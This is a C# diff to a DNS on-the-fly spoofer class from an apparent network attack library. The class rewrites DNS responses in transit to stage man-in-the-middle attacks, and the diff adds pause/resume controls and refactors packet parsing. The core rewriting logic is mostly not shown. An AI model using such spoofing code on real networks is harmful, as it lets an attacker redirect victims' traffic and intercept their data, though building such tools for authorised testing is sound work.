@@ -3,16 +3,19 @@ using System.Collections.Generic;
 using System.Text;
 using System.Net;
 using eExNetworkLibrary.DNS;
+using eExNetworkLibrary.IP;
+using eExNetworkLibrary.UDP;
 
 namespace eExNetworkLibrary.Attacks.Modification
 {
     /// <summary>
     /// This class represents a DNS on the fly spoofer which is capable of changin DNS responses on the fly and initiating a man in the middle attack this way.
     /// </summary>
-    public class DNSOnTheFlySpoofer : TrafficModifiers.TrafficModifier
+    public class DNSOnTheFlySpoofer : TrafficModifiers.TrafficModifier, IAttack
     {
         private List<DNSSpooferEntry> lDNSSpooferEntries;
         private int iDNSPort;
+        private bool bPause;
 
         /// <summary>
         /// Gets or sets the DNS port to use
@@ -108,6 +111,7 @@ namespace eExNetworkLibrary.Attacks.Modification
         public DNSOnTheFlySpoofer()
         {
             lDNSSpooferEntries = new List<DNSSpooferEntry>();
+            bPause = false;
             iDNSPort = 53;
         }
 
@@ -118,22 +122,14 @@ namespace eExNetworkLibrary.Attacks.Modification
         /// <returns>The modified frame</returns>
         protected override Frame ModifyTraffic(Frame fInputFrame)
         {
-            UDP.UDPFrame udpFrame = GetUDPFrame(fInputFrame);
-            IP.IPFrame ipFrame = GetIPv4Frame(fInputFrame);
-
-            if (ipFrame != null && udpFrame != null)
+            if (!bPause)
             {
-                if (udpFrame.DestinationPort == iDNSPort || udpFrame.SourcePort == iDNSPort)
+                IPFrame ipFrame = GetIPFrame(fInputFrame);
+                UDPFrame udpFrame = GetUDPFrame(fInputFrame);
+                DNSFrame dnsFrame = (DNSFrame)GetFrameByType(fInputFrame, FrameTypes.DNS);
+
+                if (dnsFrame != null && ipFrame != null)
                 {
-                    DNSFrame dnsFrame;
-                    if (udpFrame.EncapsulatedFrame.FrameType == FrameTypes.DNS)
-                    {
-                        dnsFrame = (DNSFrame)udpFrame.EncapsulatedFrame;
-                    }
-                    else
-                    {
-                        dnsFrame = new DNS.DNSFrame(udpFrame.EncapsulatedFrame.FrameBytes);
-                    }
                     if (dnsFrame.QRFlag)
                     {
                         foreach (DNSResourceRecord r in dnsFrame.GetAnswers())
@@ -150,8 +146,10 @@ namespace eExNetworkLibrary.Attacks.Modification
                         }
                     }
 
-                    udpFrame.EncapsulatedFrame = dnsFrame;
-                    udpFrame.Checksum = new byte[2]; //Empty checksum
+                    if (udpFrame != null)
+                    {
+                        udpFrame.Checksum = new byte[2]; //Empty checksum
+                    }
                 }
             }
 
@@ -180,6 +178,22 @@ namespace eExNetworkLibrary.Attacks.Modification
         public override void Cleanup()
         {
             //No need to do anything
+        }
+
+        /// <summary>
+        /// Pauses the attack until ResumeAttack() is called.
+        /// </summary>
+        public void PauseAttack()
+        {
+            bPause = true;
+        }
+
+        /// <summary>
+        /// Resumes the attack from a previous call of PauseAttack().
+        /// </summary>
+        public void ResumeAttack()
+        {
+            bPause = false;
         }
     }
 
